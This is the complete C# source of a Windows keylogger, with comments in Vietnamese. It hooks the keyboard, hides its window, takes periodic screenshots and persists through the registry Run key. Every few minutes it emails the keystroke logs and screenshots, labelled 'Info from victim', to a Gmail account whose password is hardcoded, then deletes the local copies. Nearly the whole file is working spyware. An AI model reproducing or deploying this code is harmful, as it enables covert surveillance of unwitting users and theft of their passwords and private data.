using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

// sử dụng thư viện user32.dll, khi muốn lấy dữ liệu thì phải truyền vào 1 cái mã để thư viện nó nhận biết được là mình muốn lấy ra cái gì bên trong đó
namespace KeyLogger
{
    class Program
    {
        #region Hook key board

        // mã mặc định của window dùng để truyền vào trong hàm
        private const int WH_KEYBOARD_LL = 13; // mã để thể hiện hành động nhả phím
        private const int WM_KEYDOWN = 0x0100; // mã để thể hiện hành động nhấn phím xuống

        private static LowLevelKeyboardProc _proc = HookCallback; // khi lấy được dữ liệu thì sẽ gọi hàm HookCallback
        // kiểu dữ liệu Int Pointer
        private static IntPtr _hookID = IntPtr.Zero; // bất kì cái gì trong windows đều có 1 cái handle, là ID của các cái đang chạy trong HĐH

        private static string logExtendtion = ".txt";

        /*
         *những cái hàm mà windows cung cấp, mình cần dùng tới nó thì gọi ra
         */
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Delegate a LowLevelKeyboardProc to use user32.dll
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Set hook into all current process
        /// </summary>
        /// <param name="proc"></param>
        /// <returns></returns>
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess()) // lấy tất cả các process đang chạy
            {
                using (ProcessModule curModule = curProcess.MainModule) {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0); // get info keyboard
                }
            }
        }

        /// <summary>
        /// Every time the OS call back pressed key. Catch them 
        /// then cal the CallNextHookEx to wait for the next key
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) // nếu có phím từ bàn phím được nhấn
            {
                int vkCode = Marshal.ReadInt32(lParam);

                CheckHotKey(vkCode);
                WriteLog(vkCode); // viết vào file
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Write pressed key into log.txt file
        /// </summary>
        /// <param name="vkCode"></param>
        static void WriteLog(int vkCode)
        {
            Console.WriteLine((Keys)vkCode); // ghi ra màn hình console
            string logNameToWrite = "New Text Document" + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true); // nếu chưa tồn tại thì tạo file mới
            sw.Write((Keys)vkCode); // ghi vào file
            sw.Close(); // đóng file
        }

        /// <summary>
        /// Start hook key board and hide the key logger
        /// Key logger only show again if pressed right Hot key
        /// </summary>
        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        #endregion

        #region HotKey

        static bool isHotKey = false;
        static bool isShowing = false;
        static Keys previoursKey = Keys.Separator;
        static void CheckHotKey(int vkCode)
        {
            if ((previoursKey == Keys.LControlKey) && (Keys)(vkCode) == Keys.Home)
                isHotKey = true;

            if (isHotKey) {
                if (!isShowing) {
                    DisplayWindow();
                }
                else
                    HideWindow();

                isShowing = !isShowing;
            }

            previoursKey = (Keys)vkCode;
            isHotKey = false;
        }

        #endregion      

        #region Capture

        static string imageExtendtion = ".png";

        static int imageCount = 0;
        static int captureTime = 1; //1 chu ki sleep cua thread
        static dynamic bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                       Screen.PrimaryScreen.Bounds.Height,
                                       PixelFormat.Format32bppArgb);
        /// <summary>
        /// Capture al screen then save into ImagePath
        /// </summary>

        //Create a new bitmap. (ma trận các điểm ảnh)
        static void CaptureScreen()
        {
            // Create a graphics object from the bitmap.
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Take the screenshot from the upper left corner to the right bottom corner.
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy); // copy từng điểm ảnh
            string directoryImage = "New Folder";
            if (!Directory.Exists(directoryImage)) {
                Directory.CreateDirectory(directoryImage); // nếu chưa có (dùng lần đầu) thì tạo file mới
            }
            // Save the screenshot to the specified path that the user has chosen.
            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + imageCount, imageExtendtion);

            try {
                bmpScreenshot.Save(imageName, ImageFormat.Png); // lưu ảnh dưới tên imageName.png
            }
            catch { }
            imageCount++;
        }

        #endregion

        #region Windows

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // hide window code
        const int SW_HIDE = 0;

        // show window code
        const int SW_SHOW = 5;

        static void HideWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }

        static void DisplayWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_SHOW);
        }

        #endregion

        #region Registry that open with window

        static void StartWithOS()
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            try {
                regkey.SetValue("Index", keyvalue);
                regstart.SetValue("ListenToUser", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                regkey.Close();
            }
            catch (System.Exception ex) {
            }
        }

        #endregion

        #region Mail

        static int mailTime = 10; // vì dung lượng file đính kèm mail tối đa là 25MB thì mới gửi được cho nên là 1 cái ảnh gần 1MB thì 10 cái là có trường hợp maximum, bởi vì lúc màn hình có nhiều màu thì dung lượng file rất lớn ~ 2MB, đấy là lý do tại sao dính lỗi time out
        static string eMail = "keylogger25032018@gmail.com";

        static void SendMail()
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

            mail.From = new MailAddress(eMail);
            mail.To.Add(eMail);
            mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
            mail.Body = "Info from victim\n";

            string logFile = "New Text Document" + logExtendtion;

            if (File.Exists(logFile)) {
                StreamReader sr = new StreamReader(logFile);
                mail.Body += sr.ReadToEnd(); // thêm nội dung file log vào phần Body của mail
                sr.Close();
            }

            string directoryImage = "New Folder";
            DirectoryInfo image = new DirectoryInfo(directoryImage);

            foreach (FileInfo item in image.GetFiles("*.png")) {
                if (File.Exists(directoryImage + "\\" + item.Name)) {
                    mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
                }
            }

            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential(eMail, "keylogger2018");
            SmtpServer.EnableSsl = true;

            try {
                SmtpServer.Send(mail);
                Console.WriteLine("\nSend mail!\n");
            }
            catch (Exception ex) {
                Console.WriteLine(ex.ToString());
            }

            // Giải phóng tất cả tài nguyên được quản lý bởi đối tượng mail thuộc class MailMessage
            // Nếu không giải phóng thì ko thể xóa file đã từng được quản lý bởi đối tượng mail, tức là file đính kèm theo mail.
            mail.Dispose();
            // SmtpServer.Dispose();

            // Xóa file text ghi nội dung, để tránh trùng lặp. Nhưng ko xóa thì nó sẽ có nội dung bao quát hơn.
            File.Delete(logFile);

            // Xóa file ảnh, đồng thời cho imageCount = 0 (ảnh được đặt tên lại từ 0)
            foreach (FileInfo item in image.GetFiles("*.png")) {
                if (File.Exists(directoryImage + "\\" + item.Name)) {
                    File.Delete(directoryImage + "\\" + item.Name);
                }
            }
            // reset bộ đếm ảnh
            imageCount = 0;

            // muốn software này gửi được mail bằng tài khoản đã cung cấp thì phải cho phép sử dụng ở bên google.
            // https://www.google.com/settings/u/1/security/lesssecureapps
        }

        #endregion

        #region Timer

        static int interval = 1;
        static void StartTimmer()
        {
            Thread thread = new Thread(() => // tạo 1 luồng chạy song song với việc bắt phím
            {
                while (true) {
                    Thread.Sleep(30000);

                    if (interval % captureTime == 0) {
                        CaptureScreen();
                        Console.WriteLine("Chup man hinh: " + DateTime.Now);
                    }

                    if (interval % mailTime == 0) {
                        SendMail();
                        Console.WriteLine("Gui mail: " + DateTime.Now);
                    }

                    interval++;

                    if (interval >= 100000)
                        interval = 0;
                }
            });
            thread.IsBackground = true;
            thread.Start();
        }

        #endregion
        static void Main(string[] args)
        {
            StartWithOS();
            HideWindow();
            StartTimmer();
            HookKeyboard();
        }
    }
}